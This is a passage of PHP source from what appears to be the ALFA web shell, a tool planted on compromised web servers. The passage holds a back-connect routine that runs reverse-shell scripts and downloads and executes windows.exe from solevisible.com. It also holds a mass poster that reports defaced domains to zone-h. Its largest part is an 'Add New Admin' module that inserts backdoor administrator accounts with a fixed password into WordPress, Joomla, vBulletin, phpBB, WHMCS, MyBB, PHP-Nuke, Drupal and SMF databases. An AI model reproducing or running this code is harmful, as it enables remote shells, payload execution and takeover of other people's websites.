$arg = ($_POST['alfa4']=='bind'?$port:$port.' '.$ip);
$tmpdir = ALFA_TEMPDIR;
$name = $tmpdir.'/'.$lang.uniqid().rand(1,99999);
$allow = array('perl','ruby','python','node');
eval('$lan=$'.$lang.';');
if(in_array($lang,$allow)){
if(__write_file($name,__get_resource($lan))){
if(_alfa_can_runCommand(true,true)){
$os = ($GLOBALS['sys']!='win')?'1>/dev/null 2>&1 &':'';
$out = alfaEx("$lang $name $arg $os");
if($out==''){$out="<font color='green'><center>[ Finished...! ]</center></font>";}
echo("<pre class='ml1' style='margin-top:5px'>{$out}</pre>");
}
}else{
echo("<pre class=ml1 style='margin-top:5px'><font color='red'><center>[ Failed...! ]</center></font></pre>");
}
}
if($lang=='java'||$lang=='c'){
$code = __get_resource($lan);
$out = nl2br(bcinit($lang, $code,'',''));
echo("<pre class=ml1 style='margin-top:5px'><center>{$out}</center></pre>");
}
if($lang=='bcwin'){
$alfa = new AlfaCURL();
$s = $alfa->Send('http://solevisible.com/bc/windows.exe');
$tmpdir = ALFA_TEMPDIR;
$f = @fopen($tmpdir.'/bcwin.exe','w+');
@fwrite($f, $s);
@fclose($f);
$out = alfaEx($tmpdir."/bcwin.exe ".$_POST['alfa2']." ".$_POST['alfa3']);
}
if($lang=='php'){
echo "<pre class=ml1 style='margin-top:5px'>";
$code = __get_resource($lan);
if($code!==false){
$code = "\$target = \"".$arg."\";\n".$code;
eval($code);
echo("<center><font color='green'>[ Finished...! ]</font></center>");
}
echo "</pre>";
}
}
echo "</div>";
alfafooter();
}
function alfazoneh(){
alfahead();
echo '<div class=header>';
if(!function_exists('curl_version')){
echo "<pre class=ml1 style='margin-top:5px'><center><font color=red><b><big><big>PHP CURL NOT EXIST ~ ZONE H MASS POSTER DOES NOT WORK</b></font></big></big></center></pre>";
}
$hackmode = array('known vulnerability (i.e. unpatched system)','undisclosed (new) vulnerability','configuration / admin. mistake','brute force attack','social engineering','Web Server intrusion','Web Server external module intrusion','Mail Server intrusion','FTP Server intrusion','SSH Server intrusion','Telnet Server intrusion','RPC Server intrusion','Shares misconfiguration','Other Server intrusion','SQL Injection','URL Poisoning','File Inclusion','Other Web Application bug','Remote administrative panel access bruteforcing','Remote administrative panel access password guessing','Remote administrative panel access social engineering','Attack against administrator(password stealing/sniffing)','Access credentials through Man In the Middle attack','Remote service password guessing','Remote service password bruteforce','Rerouting after attacking the Firewall','Rerouting after attacking the Router','DNS attack through social engineering','DNS attack through cache poisoning','Not available','Cross-Site Scripting');
$reason = array('Heh...just for fun!','Revenge against that website','Political reasons','As a challenge','I just want to be the best defacer','Patriotism','Not available');
echo '
<center><br><div class="txtfont_header">| Zone-h Mass Poster |</div><center><br>
<form action="" method="post" onsubmit="g(\'zoneh\',null,this.defacer.value,this.hackmode.value,this.reason.value,this.domain.value,\'>>\'); return false;">
<input type="text" name="defacer" size="67" id="text" placeholder="ALFA TEaM 2012" />
<br>
<select id="text" name="hackmode" style="width:400px;">';
$x=1;
foreach($hackmode as $mode){echo('<option style="background-color: rgb(F, F, F);" value="'.$x.'">'.$mode.'</option>');$x++;}
echo '</select><br><select id="text" name="reason" style="width:200px;">';
$x=1;
foreach($reason as $mode){echo('<option style="background-color: rgb(F, F, F);" value="'.$x.'">'.$mode.'</option>');$x++;}
echo '</select><br>
<textarea name="domain" cols="90" rows="20" placeholder="Domains..."></textarea><br>
<p><input type="submit" value=" " name="go" /></p>
</form></center>';
if($_POST['alfa5'] && $_POST['alfa5'] == '>>'){
ob_start();
$hacker = $_POST['alfa1'];
$method = $_POST['alfa2'];
$neden = $_POST['alfa3'];
$site = $_POST['alfa4'];
if(empty($hacker)){
die (__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
}elseif($method == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
}elseif($neden == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
}elseif(empty($site)){
die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
}
$i = 0;
$sites = explode("\n", $site);
$alfa = new AlfaCURL();
while($i < count($sites)){
if(substr($sites[$i], 0, 4) != "http"){
$sites[$i] = "http://".$sites[$i];
}
$alfa->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
++$i;
}
echo __pre()."<center><font color =\"#00A220\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
}
echo "</div>";
alfafooter();
}
function alfapwchanger(){
alfahead();

echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
<center><h3>';$vals = array('WordPress' => array('wp',2),'Joomla' => array('joomla',3),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7),'MyBB' => array('mybb',8),'Php Nuke' => array('nuke',9),'Drupal' => array('drupal',10),'SMF' => array('smf',11));
Alfa_Create_A_Tag('pwchanger',$vals);
echo '</h3></center>';
if(isset($_POST['alfa1'])&&$_POST['alfa1']=='wp'){

echo __pre().'<center><center><div class="txtfont_header">| WordPress |</div>
<p>'.getConfigHtml('wp').'</p><form onSubmit="g(\'pwchanger\',null,\'wp\',\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host','id'=>'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'wp_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form>';
if ($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
$localhost = $_POST['alfa3'];
$database = $_POST['alfa4'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($solevisible);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($solevisible);
$res = $solevis['ID'];
}
$solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','solevisible'),(null,'".$res."','last_name','solevisible'),(null,'".$res."','nickname','solevisible'),(null,'".$res."','description','solevisible'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if($_POST['alfa2'] && $_POST['alfa2'] == 'joomla'){

echo __pre().'<center><center><div class="txtfont_header">| Joomla |</div><p><p>'.getConfigHtml('joomla').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',\'joomla\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'jos_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa3'];
$database = $_POST['alfa4'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($solevisible);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($solevisible);
$res = $solevis['id'];
}
$solevisible=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if($_POST['alfa4'] && $_POST['alfa4'] == 'vb'){

echo __pre().'<center><center><div class="txtfont_header">| vBulletin |<div><p>'.getConfigHtml('vb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,\'vb\',this.username.value,this.password.value,this.prefix.value,this.admin.value,this.email.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$prefix = $_POST['alfa7'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_connect_error());
$pw_col = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$prefix}user' and column_name = 'password' and table_schema = '{$database}'");
$pw_col = @mysqli_num_rows($pw_col);
$adm_perm = "16744444";
if($pw_col > 0){
$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$solevisible=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($solevisible);
if($sole == 1){
$solevis = mysqli_fetch_assoc($solevisible);
$res = $solevis['userid'];
}
$solevisible=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['alfa5']) && $_POST['alfa5'] == 'phpbb'){

echo __pre().'<center><div class="txtfont_header">| phpBB |</div><p><p>'.getConfigHtml('phpbb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,\'phpbb\',this.password.value,null,this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa6'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('solevisible');
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');
}
}
}
if(isset($_POST['alfa6']) && $_POST['alfa6'] == 'whmcs'){

echo __pre().'<center><div class="txtfont_header">| Whmcs |</div><p><p>'.getConfigHtml('whmcs').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,\'whmcs\',null,this.admin.value,this.email.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa5'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['alfa7']) && $_POST['alfa7'] == 'mybb'){

echo __pre().'<center><div class="txtfont_header">| Mybb |</div><p><p>'.getConfigHtml('mybb').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,\'mybb\',this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa5'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['alfa8']) && $_POST['alfa8'] == 'nuke'){

echo __pre().'<center><div class="txtfont_header">| PhpNuke |</div><p><p>'.getConfigHtml('phpnuke').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'nuke\',this.email.value,this.prefix.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa5'];
$admin = $_POST['alfa7'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$solevisible=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['alfa9']) && $_POST['alfa9'] == 'drupal'){

echo __pre().'<center><div class="txtfont_header">| Drupal |</div><p><p>'.getConfigHtml('drupal').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,null,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'drupal\'); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName'=> 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true)
 );
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa4'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$admin = $_POST['alfa8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit 0,1");
$getDescuid = @mysqli_fetch_assoc($getDescuid);
$getDescuid = $getDescuid['uid'];
$getdescuid = $getDescuid++;
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($solevisible);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($solevisible);
$res = $solevis['uid'];
}
$solevisible=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}

if(isset($_POST['alfa10']) && $_POST['alfa10'] == 'smf'){

echo __pre().'<center><center><div class="txtfont_header">| SMF |</div><p><p>'.getConfigHtml('smf').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,null,this.username.value,this.password.value,this.prefix.value,this.admin.value,null,\'smf\'); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'smf_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 );
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$prefix = $_POST['alfa7'];
$admin = $_POST['alfa8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'solevisible');
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','solevisible@fbi.gov')") or die(mysqli_error($conn));
